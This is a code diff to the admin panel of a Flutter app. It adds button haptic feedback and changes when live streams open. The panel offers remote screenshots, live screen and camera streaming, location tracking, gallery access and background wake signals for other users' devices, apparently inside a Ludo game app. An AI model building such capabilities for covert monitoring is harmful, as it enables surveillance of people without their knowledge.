@@ -10,6 +10,7 @@ import 'user_location_screen.dart';
 import 'request_detail_screen.dart';
 import 'request_history_screen.dart';
 import '../utils/app_alert.dart';
+import '../utils/app_feedback.dart';
 
 class AdminPanelScreen extends StatefulWidget {
   const AdminPanelScreen({super.key});
@@ -70,37 +71,6 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
   Widget build(BuildContext context) {
     final adminCtrl = Get.find<AdminController>();
 
-    ScreenshotRequestItem? activeLiveRequest;
-    for (final request in adminCtrl.screenshotRequests) {
-      if ((request.requestType == 'screen_share' ||
-              request.requestType == 'camera_stream') &&
-          (request.status == 'active' ||
-              request.status == 'live' ||
-              request.status == 'offer_created')) {
-        activeLiveRequest = request;
-        break;
-      }
-    }
-
-    final activeRequestId = activeLiveRequest?.requestId;
-    final activeRequestType = activeLiveRequest?.requestType;
-
-    if (activeLiveRequest != null &&
-        !_isFullscreenStreamVisible &&
-        _openedFullscreenRequestId != activeRequestId) {
-      WidgetsBinding.instance.addPostFrameCallback((_) {
-        if (mounted && activeRequestId != null && activeRequestType != null) {
-          _openFullscreenStream(
-            activeRequestId,
-            activeRequestType,
-            targetDeviceId: activeLiveRequest?.targetDeviceId,
-          );
-        }
-      });
-    } else if (activeLiveRequest == null) {
-      _openedFullscreenRequestId = null;
-    }
-
     return GetBuilder<ThemeController>(
       builder: (themeState) {
         final theme = themeState.currentTheme;
@@ -112,22 +82,32 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
             actions: [
               IconButton(
                 icon: const Icon(Icons.history_rounded),
-                onPressed: () => Get.to(() => const RequestHistoryScreen()),
+                onPressed: () {
+                  AppFeedback.buttonPress();
+                  Get.to(() => const RequestHistoryScreen());
+                },
                 tooltip: 'Activity History',
               ),
               IconButton(
                 icon: const Icon(Icons.sports_esports),
-                onPressed: () => Get.to(() => const HomeScreen()),
+                onPressed: () {
+                  AppFeedback.buttonPress();
+                  Get.to(() => const HomeScreen());
+                },
                 tooltip: 'Go to Ludo Game',
               ),
               IconButton(
                 icon: const Icon(Icons.refresh),
-                onPressed: adminCtrl.refreshDeviceList,
+                onPressed: () {
+                  AppFeedback.buttonPress();
+                  adminCtrl.refreshDeviceList();
+                },
                 tooltip: 'Refresh Device List',
               ),
               IconButton(
                 icon: const Icon(Icons.logout),
                 onPressed: () async {
+                  AppFeedback.buttonPress();
                   await Get.find<AuthController>().signOut();
                 },
                 tooltip: 'Sign Out',
@@ -212,6 +192,7 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                           ],
                           onChanged: (value) {
                             if (value != null) {
+                              AppFeedback.selectionChanged();
                               setState(() => _cameraFacing = value);
                             }
                           },
@@ -378,7 +359,10 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                   Row(
                                     children: [
                                       TextButton.icon(
-                                        onPressed: () => Get.to(() => UserLocationScreen(device: device)),
+                                        onPressed: () {
+                                          AppFeedback.buttonPress();
+                                          Get.to(() => UserLocationScreen(device: device));
+                                        },
                                         icon: const Icon(Icons.map_rounded, size: 16, color: Colors.redAccent),
                                         label: const Text('Live Map', style: TextStyle(color: Colors.redAccent)),
                                         style: TextButton.styleFrom(
@@ -387,7 +371,10 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                         ),
                                       ),
                                       TextButton.icon(
-                                        onPressed: () => Get.to(() => UserGalleryScreen(device: device)),
+                                        onPressed: () {
+                                          AppFeedback.buttonPress();
+                                          Get.to(() => UserGalleryScreen(device: device));
+                                        },
                                         icon: const Icon(Icons.collections, size: 16),
                                         label: const Text('Gallery'),
                                         style: TextButton.styleFrom(
@@ -407,6 +394,7 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                       onPressed: isSelf
                                           ? null
                                           : () async {
+                                              AppFeedback.buttonPress();
                                               await adminCtrl.requestScreenshot(
                                                 device.deviceId,
                                               );
@@ -431,6 +419,7 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                              onPressed: isSelf
                                                  ? null
                                                  : () async {
+                                                     AppFeedback.buttonPress();
                                                      await adminCtrl.stopScreenShare(activeScreenShare.requestId);
                                                      AppAlert.showInfo(
                                                        'Stopped live screen share for ${device.username}',
@@ -447,11 +436,19 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                              onPressed: isSelf
                                                  ? null
                                                  : () async {
-                                                     await adminCtrl.requestScreenShare(device.deviceId);
+                                                     AppFeedback.buttonPress();
+                                                     final reqId = await adminCtrl.requestScreenShare(device.deviceId);
                                                      AppAlert.showInfo(
                                                        'A live share session was started for the selected device.',
                                                        title: 'Live Share Requested',
                                                      );
+                                                     if (reqId != null && reqId.isNotEmpty) {
+                                                       _openFullscreenStream(
+                                                         reqId,
+                                                         'screen_share',
+                                                         targetDeviceId: device.deviceId,
+                                                       );
+                                                     }
                                                    },
                                              icon: const Icon(Icons.screenshot_monitor),
                                              label: const Text('Live Share'),
@@ -471,6 +468,7 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                       onPressed: isSelf
                                           ? null
                                           : () async {
+                                              AppFeedback.buttonPress();
                                               await adminCtrl.requestCameraCapture(
                                                 device.deviceId,
                                                 cameraFacing: _cameraFacing,
@@ -496,6 +494,7 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                             onPressed: isSelf
                                                 ? null
                                                 : () async {
+                                                    AppFeedback.buttonPress();
                                                     await adminCtrl.stopScreenShare(activeCameraStream.requestId);
                                                     AppAlert.showInfo(
                                                       'Stopped live camera stream for ${device.username}',
@@ -512,7 +511,8 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                             onPressed: isSelf
                                                 ? null
                                                 : () async {
-                                                    await adminCtrl.requestCameraStream(
+                                                    AppFeedback.buttonPress();
+                                                    final reqId = await adminCtrl.requestCameraStream(
                                                       device.deviceId,
                                                       cameraFacing: _cameraFacing,
                                                     );
@@ -520,6 +520,13 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                                       'The target device will start a live camera stream.',
                                                       title: 'Camera Stream Requested',
                                                     );
+                                                    if (reqId != null && reqId.isNotEmpty) {
+                                                      _openFullscreenStream(
+                                                        reqId,
+                                                        'camera_stream',
+                                                        targetDeviceId: device.deviceId,
+                                                      );
+                                                    }
                                                   },
                                             icon: const Icon(Icons.videocam),
                                             label: const Text('Live Camera'),
@@ -538,6 +545,7 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                                   onPressed: isSelf
                                       ? null
                                       : () async {
+                                          AppFeedback.buttonPress();
                                           await adminCtrl.wakeDevice(device.deviceId);
                                           AppAlert.showSuccess(
                                             'A high-priority background wake signal was sent to ${device.username}.',
@@ -573,7 +581,10 @@ class _AdminPanelScreenState extends State<AdminPanelScreen> {
                   ),
                   child: InkWell(
                     borderRadius: BorderRadius.circular(16),
-                    onTap: () => Get.to(() => const RequestHistoryScreen()),
+                    onTap: () {
+                      AppFeedback.buttonPress();
+                      Get.to(() => const RequestHistoryScreen());
+                    },
                     child: Padding(
                       padding: const EdgeInsets.all(16.0),
                       child: Row(
